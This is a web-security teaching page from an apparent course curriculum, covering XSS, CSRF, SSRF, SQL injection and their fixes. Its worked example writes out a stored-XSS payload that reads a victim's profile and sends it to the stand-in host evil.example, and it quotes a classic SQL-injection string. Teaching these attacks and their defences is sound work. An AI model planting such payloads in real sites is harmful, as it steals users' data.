---
id: security/web-security
title: Web Security
band: B4
track: security
tier: T2
bloom_target: apply
prerequisites: [security/authentication-authorization, systems-software/http-basics]
related: [security/threat-modeling, security/secure-sdlc]
recommended: []
status: draft
schema-version: 1
owner: l1-web-security
reviewed-by: []
updated: 2026-08-18
sources: [S-0017, S-0019, S-0023, S-0247, S-0248, S-0249]
---

# Web Security — teaching

## Learning objectives (Bloom)

By the end of this topic you will be able to:

- **Understand** — explain injection, XSS (reflected/stored/DOM), CSRF, SSRF, and the same-origin policy in terms of where trust crosses a boundary.
- **Apply** — fix a vulnerable web feature (SQLi, XSS, CSRF, SSRF) by choosing the correct control at the correct layer.
- **Apply** — harden a web deployment with security headers (CSP, HSTS) and cookie attributes, and justify each against a specific attack.

## Worked example: XSS exploit and fix walkthrough

Scenario: a support portal lets agents add a comment to a ticket; comments are stored and rendered on every subsequent view. A session cookie is HttpOnly+Secure+SameSite=Lax.

1. **Trace the attack.** Agent Mallory posts the comment `Nice work! <script>fetch('/api/agent/profile',{credentials:'same-origin'}).then(r=>r.json()).then(d=>fetch('//evil.example/?data='+JSON.stringify(d)))</script>`. The comment is stored verbatim in the database. Later, victim Agent Alice opens the ticket; the portal renders the comment into the HTML body of her page without encoding. The script executes with the portal's origin (RFC 6454: the document leaked its authority to the untrusted content), reads Alice's profile via a same-origin fetch, and exfiltrates it. Classification: **stored XSS** — the payload is persisted server-side and hits every later viewer. Because the session cookie is HttpOnly, the script cannot steal the cookie itself — but it can still act as Alice through her browser, which is most of what an attacker wants.
2. **Fix at the correct layer.** (a) Rendering: encode the comment for the HTML-body context when it is output (the value is data, not markup) — the script tag renders as text. (b) Defense in depth: CSP `default-src 'self'` restricts script sources and blocks the inline script even if encoding fails somewhere; `require-trusted-types-for 'script'` hardens DOM sinks. (c) Input side: store the comment as plain text / allow-list the rich-text format at parse time — but note the output encoding is the control that actually stops this class.
3. **Verify.** Replay the payload; confirm it renders as text. Run the same test through the API endpoint and the search/reflected path; DOM-based paths are verified in the browser (payload never reaches the server).
4. **Generalize.** The same trace works for SQLi (structure vs data in a SQL context) and CSRF (ambient authority + send-permitted asymmetry): name the boundary, name the trust crossing, apply the control at the boundary.

## Elaboration prompts

- Why does encoding for the "HTML body" context differ from encoding for an attribute or a JavaScript string? What breaks if you always HTML-encode everything?
- In the CSRF trace, why does the SameSite attribute stop the cookie from traveling while the synchronizer token stops the forged request — and why do you want both?
- Why is a deny-list of evil URLs/characters structurally weaker than an allow-list? Trace an SSRF bypass around a regex of "bad" hosts.
- The same-origin policy "restricts" cross-origin interaction — which interactions does it not restrict, and what attacks fall out of that asymmetry?
- If HttpOnly protects the session cookie from XSS, why is the XSS still a critical vulnerability?

## Common misconceptions

- **"HTTPS makes the app secure"** — TLS protects bytes in transit. The application-level risks (injection, XSS, CSRF, SSRF, broken access control) are served over the encrypted pipe unchanged. HSTS ensures clients refuse plaintext; it does not fix application logic.
- **"CSP fixes XSS, so I can skip output encoding"** — CSP is a containment layer that OWASP explicitly warns against relying on alone: legacy pages, permissive policies (unsafe-inline), and encoding mistakes still leak. Encoding at the boundary is the primary control.
- **"The same-origin policy blocks all cross-site access, so CSRF can't work"** — the policy blocks reads, not sends; browsers attach cookies by cookie scope (host/domain), not origin. Both properties are needed to explain why CSRF exists.
- **"I escape user input, so I'm safe from injection"** — escaping is the strongly discouraged fourth-line defense; it fails on context and encoding differences. Parameterized queries eliminate the class by construction.
- **"XSS only matters if there's a login"** — reflected XSS on a "read-only" or brochure site still executes in victims' browsers with the site's origin (crypto mining, phishing overlays, malware drops); "no user data" is not a defense.

## Feynman targets

Explain each in plain language to a colleague who has never done web security:

1. Why a browser can display evil.example's page but that page cannot read bank.example's inbox — and why it *can* make bank.example send money.
2. The difference between stored, reflected, and DOM-based XSS, with one concrete example of each.
3. Why a parameterized query makes `' OR '1'='1` harmless, in terms of "structure vs data".
4. Why "allow-list, don't deny-list" is a rule for SSRF, CSP, and input validation alike.

## Interleaving hooks

- **Authentication & authorization** — CSRF and XSS are attacks on the *session* you designed there; the cookie attributes and session-ID hygiene from that pack are this pack's first-line defenses. Re-explain the session lifecycle now from the attacker's side.
- **HTTP basics** — the same-origin policy, cookies, Host/Origin headers, and the HTTP auth framework are protocol semantics you already know (`systems-software/http-basics`); if cookie scoping or header behavior feels fuzzy, revisit before the CSRF/CORS discussions.
- **Threat modeling** — classify each vulnerability in STRIDE terms and ask "where is the trust boundary?" for SQLi, XSS, CSRF, and SSRF; the SSRF and CSRF traces above are miniature threat models.
